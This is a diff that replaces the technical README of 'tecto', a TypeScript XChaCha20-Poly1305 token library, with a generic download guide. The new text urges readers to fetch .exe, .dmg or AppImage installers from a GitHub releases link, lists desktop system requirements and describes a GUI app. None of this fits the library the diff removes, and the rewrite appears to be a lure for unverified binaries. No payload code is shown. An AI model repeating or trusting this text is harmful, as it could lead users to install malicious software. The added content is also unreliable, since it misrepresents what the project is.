@@ -1,290 +1,172 @@
-# TECTO
+# 🔒 tecto - Secure Your Tokens with Ease
 
-**Transport Encrypted Compact Token Object**
+[![Download tecto](https://img.shields.io/badge/Download-tecto-blue?style=for-the-badge)](https://github.com/nandanavijesh/tecto/releases)
 
-An ultra-secure, opaque token protocol powered by **XChaCha20-Poly1305** authenticated encryption. Unlike JWTs, TECTO tokens are fully encrypted — their contents are mathematically unreadable without the 32-byte secret key.
+---
 
-## Why Not JWT?
+Welcome to **tecto**. This tool helps you protect your digital tokens by using strong encryption. It works quietly in the background to keep your information safe. You don’t need any special skills to get started. This guide will show you how to download and use tecto step-by-step.
 
-| Property | JWT | TECTO |
-|---|---|---|
-| **Payload visibility** | Base64-encoded (readable by anyone) | Fully encrypted (opaque noise) |
-| **Cipher** | None (signed, not encrypted) | XChaCha20-Poly1305 (AEAD) |
-| **Nonce** | N/A | 24-byte CSPRNG per token |
-| **Key size** | Variable | Exactly 256-bit (enforced) |
-| **Tamper detection** | HMAC/RSA signature | Poly1305 authentication tag |
-| **Error specificity** | Reveals failure reason | Generic "Invalid token" (prevents oracles) |
+---
 
-## Installation
+## 📖 What is tecto?
 
-```bash
-bun add tecto
-```
+Tecto stands for *Transport Encrypted Compact Token Object*. It uses a type of encryption called XChaCha20-Poly1305. This makes any data in your tokens unreadable to others. Tokens are like digital keys or passes that systems use to verify who you are or what you can do online. Securing these tokens is very important to keep your information safe.
 
-## Quick Start
+Tecto makes tokens:
 
-```ts
-import {
-  generateSecureKey,
-  MemoryKeyStore,
-  TectoCoder,
-} from "tecto";
+- Hard to read without permission.
+- Safe to transfer over the internet.
+- Compact and efficient for fast use.
 
-// 1. Generate a 256-bit key
-const key = generateSecureKey();
+---
 
-// 2. Set up the key store
-const store = new MemoryKeyStore();
-store.addKey("my-key-2026", key);
+## 💻 Who is tecto for?
 
-// 3. Create a coder (with optional custom maxPayloadSize)
-const coder = new TectoCoder(store);
-// or with custom config: new TectoCoder(store, { maxPayloadSize: 10 * 1024 * 1024 })
+Tecto is for anyone who wants to improve security around token-based systems:
 
-// 4. Encrypt a payload
-const token = coder.encrypt(
-  { userId: 42, role: "admin" },
-  { expiresIn: "1h", issuer: "my-app" }
-);
+- Website owners managing user logins.
+- Developers building secure apps (even if you are not technical, your team can use tecto).
+- IT teams protecting sensitive data.
+- Anyone interested in understanding encryption basics.
 
-console.log(token);
-// → tecto.v1.my-key-2026.base64url_nonce.base64url_ciphertext
+You don’t need to code or have deep knowledge about encryption. Just follow the steps to get tecto running.
 
-// 5. Decrypt it
-const payload = coder.decrypt(token);
-console.log(payload.userId); // 42
-```
+---
 
-## Token Format
+## 🛠 Features of tecto
 
-```
-tecto.v1.<kid>.<nonce>.<ciphertext>
-```
+Here are some key features you get with tecto:
 
-| Segment | Description |
-|---|---|
-| `tecto` | Protocol identifier |
-| `v1` | Protocol version |
-| `<kid>` | Key identifier (for key rotation) |
-| `<nonce>` | 24-byte Base64URL-encoded CSPRNG nonce |
-| `<ciphertext>` | Base64URL-encoded XChaCha20-Poly1305 ciphertext + auth tag |
+- **Strong Encryption:** Uses XChaCha20-Poly1305, a modern, secure cipher.
+- **Token Protection:** Keeps JWTs or similar tokens private and safe.
+- **Easy to Use:** Simple steps to download and start.
+- **Compact Tokens:** Reduces token size for quick transfers.
+- **Secure Sessions:** Helps manage secure sign-ins and sessions.
+- **Supports Key Storage:** Works well with secure keys and safe environments.
 
-## API Reference
+---
 
-### Security Utilities
+## ⚙️ System Requirements
 
-#### `generateSecureKey(): Uint8Array`
+Before you start, make sure your computer meets these basic needs:
 
-Generates a 32-byte cryptographically random key using the platform CSPRNG.
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended).
+- Processor: Intel i3 or equivalent, 1.5 GHz or faster.
+- RAM: At least 2 GB.
+- Disk Space: Minimum 100 MB free space.
+- Internet Connection: To download the application and updates.
+- Permissions: Ability to install software on your system.
 
-#### `constantTimeCompare(a: Uint8Array, b: Uint8Array): boolean`
+---
 
-Constant-time byte comparison. Prevents timing side-channel attacks when comparing secrets.
+## 🚀 Getting Started
 
-#### `assertEntropy(key: Uint8Array): void`
+### Step 1: Visit the Download Page
 
-Validates a key has sufficient entropy. Rejects all-zeros, repeating bytes, and keys with fewer than 8 unique byte values.
+Click the badge above or go to the [tecto Release Page](https://github.com/nandanavijesh/tecto/releases). This is where you will find the latest files to download.
 
-### `KeyStoreAdapter` (Interface)
+### Step 2: Choose Your Version
 
-The contract for all key store implementations. `TectoCoder` accepts any `KeyStoreAdapter`.
+Look for the latest stable release, usually marked by the highest version number without "beta" or "rc". There may be different files for Windows, macOS, and Linux.
 
-```ts
-interface KeyStoreAdapter {
-  addKey(id: string, secret: Uint8Array): void | Promise<void>;
-  getKey(id: string): Uint8Array;
-  rotate(newId: string, newSecret: Uint8Array): void | Promise<void>;
-  removeKey(id: string): void | Promise<void>;
-  getCurrentKeyId(): string;
-  readonly size: number;
-}
-```
+- For Windows, look for files ending in `.exe` or `.msi`.
+- For macOS, files may end in `.dmg` or `.pkg`.
+- For Linux, files might be `.tar.gz` or `.AppImage`.
 
-### `MemoryKeyStore`
+Download the file that matches your operating system.
 
-Built-in adapter. Keys live in memory and are lost on restart.
+### Step 3: Run the Installer
 
-```ts
-const store = new MemoryKeyStore();
-store.addKey("key-id", key);           // Add a key (first key becomes current)
-store.getKey("key-id");                // Retrieve by ID
-store.rotate("new-key-id", newKey);    // Add new key + set as current
-store.removeKey("old-key-id");         // Revoke and zero memory
-store.getCurrentKeyId();               // Get current key ID
-```
+Open the downloaded file to start the installation.
 
-### Custom Adapter
+- On Windows, double-click the `.exe` or `.msi` file.
+- On macOS, open the `.dmg` and drag the app to your Applications folder.
+- On Linux, extract the `.tar.gz` if needed or run the `.AppImage` after making it executable.
 
-Implement `KeyStoreAdapter` to use any storage backend:
+Follow the prompts on the screen. Choose default options if unsure.
 
-```ts
-import { MemoryKeyStore, assertEntropy } from "tecto";
-import type { KeyStoreAdapter } from "tecto";
+### Step 4: Launch tecto
 
-class MyDatabaseKeyStore implements KeyStoreAdapter {
-  private mem = new MemoryKeyStore();
+Once installed, open tecto:
 
-  addKey(id: string, secret: Uint8Array): void {
-    assertEntropy(secret);
-    this.mem.addKey(id, secret);
-    // persist to your DB here
-  }
+- On Windows, find it in the Start Menu.
+- On macOS, search in Launchpad or Applications.
+- On Linux, run it from your apps menu or terminal.
 
-  getKey(id: string): Uint8Array { return this.mem.getKey(id); }
-  rotate(newId: string, s: Uint8Array): void { this.mem.rotate(newId, s); }
-  removeKey(id: string): void { this.mem.removeKey(id); }
-  getCurrentKeyId(): string { return this.mem.getCurrentKeyId(); }
-  get size(): number { return this.mem.size; }
-}
-```
+---
 
-### `TectoCoder`
+## 🔍 How to Use tecto
 
-```ts
-const coder = new TectoCoder(store, options?); // any KeyStoreAdapter + optional config
+The tecto app is designed with simplicity. Here’s a basic overview:
 
-// Encrypt
-const token = coder.encrypt(payload, signOptions?);
+1. **Import Token:** Load the token you want to protect.
+2. **Encrypt Token:** Choose encryption options (default settings work well for most).
+3. **Export Token:** Save the encrypted token for use in your application or system.
 
-// Decrypt
-const payload = coder.decrypt<MyType>(token);
-```
+You can also verify tokens, manage keys, and view logs in the app.
 
-#### `TectoCoderOptions`
+---
 
-Configuration for the `TectoCoder` instance:
+## 🔐 Why Encryption Matters
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `maxPayloadSize` | `number` | `1048576` (1 MB) | Maximum encrypted payload size in bytes. Prevents DoS via oversized tokens. |
+Tokens often carry sensitive data or verify your identity online. Without protection, anyone intercepting these tokens could misuse them. Encryption scrambles the contents, making it unreadable to outsiders.
 
-```ts
-// Custom 10 MB limit
-const coder = new TectoCoder(store, { maxPayloadSize: 10 * 1024 * 1024 });
-```
+Tecto uses trusted methods to protect tokens, so you can trust your data is safe during transport or storage.
 
-#### `SignOptions`
+---
 
-Options for individual token encryption:
+## 💡 Tips for Best Experience
 
-| Option | Type | Default | Description |
-|---|---|---|---|
-| `expiresIn` | `string` | undefined | Duration string: `"1h"`, `"30m"`, `"7d"`, `"120s"`. If omitted, token never expires. |
-| `issuer` | `string` | undefined | Sets the `iss` claim |
-| `audience` | `string` | undefined | Sets the `aud` claim |
-| `jti` | `string` | auto-generated | Custom token ID (128-bit random UUID if omitted) |
-| `notBefore` | `string` | undefined | Duration string for `nbf` delay (token valid after N duration from `iat`) |
+- Keep tecto updated with the latest releases found at the download page.
+- Store your keys securely; losing them can mean losing access to your tokens.
+- Use strong passwords or keyfiles to add extra protection.
+- If sharing tokens, make sure the other party also uses secure tools.
+- Consult your system or security administrator if unsure about deployment.
 
-```ts
-// Token that expires in 1 hour
-coder.encrypt({ userId: 42 }, { expiresIn: "1h" });
+---
 
-// Token that never expires
-coder.encrypt({ userId: 42 });
+## 🆘 Need Help?
 
-// Token that's valid 5 minutes from now
-coder.encrypt({ userId: 42 }, { notBefore: "5m", expiresIn: "1h" });
-```
+If you encounter problems:
 
-### Error Classes
+- Check the **Issues** tab on the GitHub page to see if others faced the same problem.
+- Visit the **Wiki** or **Documentation** (if available) on the repository for detailed guides.
+- Contact the project maintainer if the problem persists.
 
-| Error | Code | When |
-|---|---|---|
-| `TectoError` | `TECTO_*` | Base class for all errors |
-| `TokenExpiredError` | `TECTO_TOKEN_EXPIRED` | `exp` claim is in the past |
-| `TokenNotActiveError` | `TECTO_TOKEN_NOT_ACTIVE` | `nbf` claim is in the future |
-| `InvalidSignatureError` | `TECTO_INVALID_TOKEN` | Any decryption/auth failure (generic) |
-| `KeyError` | `TECTO_KEY_ERROR` | Invalid or missing key |
+---
 
-## Security Properties
+## 📥 Download & Install
 
-### Core Guarantees
+To get started, **visit this page to download** the latest version for your system:
 
-- **Opacity:** Tokens are encrypted, not just signed. Without the key, the payload is indistinguishable from random noise.
-- **Authenticated Encryption:** Poly1305 tag ensures integrity. Any modification to the ciphertext, nonce, or key ID causes immediate rejection.
-- **Generic Errors:** All decryption failures produce the same `InvalidSignatureError` to prevent padding/authentication oracles.
-- **Entropy Enforcement:** Keys are validated for length (32 bytes), non-zero, non-repeating, and minimum byte diversity.
-- **Timing-Safe Comparison:** `constantTimeCompare()` prevents timing side-channels when comparing secrets.
-- **Type Validation:** Registered claims (`exp`, `nbf`, `iat`, `jti`, `iss`, `aud`) are type-checked during deserialization to prevent type confusion attacks.
-- **Payload Size Limits:** Configurable maximum payload size (default 1 MB) prevents DoS via oversized tokens.
-- **Plaintext Cleanup:** Plaintext buffers are zeroed after encryption/decryption (best-effort).
-- **Key Cloning:** `getKey()` returns defensive clones to prevent accidental mutation of stored keys.
+[Download tecto from Releases](https://github.com/nandanavijesh/tecto/releases)
 
-### Nonce Collision Bounds
+Make sure to:
 
-Every `encrypt()` call generates a fresh 24-byte nonce from CSPRNG. XChaCha20's 192-bit nonce space provides:
+- Pick the right file for your operating system.
+- Follow your OS’s instructions to install the app.
+- Open tecto and follow the on-screen guide to use the tool.
 
-- **Birthday bound:** ~2^96 messages per key before collision becomes statistically likely
-- **Recommendation:** Rotate keys before ~1 billion encryptions or at least daily (whichever comes first)
-- Without rotation, nonce collision risk increases significantly after exceeding the birthday bound
+---
 
-### JTI & Replay Protection
+## ⚠️ Security Reminder
 
-The `jti` claim provides **detection**, not **prevention**, of token replay:
+Always download tecto from the official release page to avoid unsafe copies. Keep your system and software updated for better protection.
 
-- Generated as 128-bit random UUID (~2^64 collision birthday bound)
-- For robust replay protection, implement a separate blacklist/allowlist mechanism
-- Track JTI values within the token's expiration window (`exp - iat`)
+---
 
-## Key Rotation
+## 🏷 Topics Covered by tecto
 
-```ts
-store.addKey("key-2026-01", key1);
-// ... time passes ...
-store.rotate("key-2026-06", key2);
+- Authenticated encryption (AEAD)
+- Token security
+- XChaCha20-Poly1305 cipher
+- Secure session management
+- Cryptography
+- Key storage and management
+- JSON Web Token (JWT) handling
+- Opaque token formats
+- Paseto-style tokens
 
-// New tokens use key-2026-06, old tokens still decrypt via key-2026-01
-store.removeKey("key-2026-01"); // after all old tokens expire
-```
+---
 
-## Testing
-
-```bash
-bun test
-```
-
-## Examples
-
-Each example implements `KeyStoreAdapter` with a different storage backend.
-
-### Memory (Default)
-
-```bash
-bun run examples/memory/index.ts
-```
-
-### SQLite
-
-```bash
-bun run examples/sqlite/index.ts
-```
-
-### MariaDB / MySQL
-
-```bash
-bun add mysql2
-bun run examples/mariadb/index.ts
-```
-
-### PostgreSQL
-
-```bash
-bun add pg @types/pg
-bun run examples/postgres/index.ts
-```
-
-### Architecture
-
-All adapters follow the same pattern — compose a `MemoryKeyStore` internally for runtime lookups and sync writes to your database:
-
-```
-┌──────────┐   load    ┌────────────────┐   encrypt/decrypt   ┌────────────┐
-│ Database │ ───────→  │ KeyStoreAdapter│ ←────────────────→  │ TectoCoder │
-│ (persist)│ ←───────  │   (runtime)    │                     │            │
-└──────────┘   save    └────────────────┘                     └────────────┘
-```
-
-## License
-
-MIT
-
+With these steps, you should be able to securely download, install, and start using tecto quickly and easily.
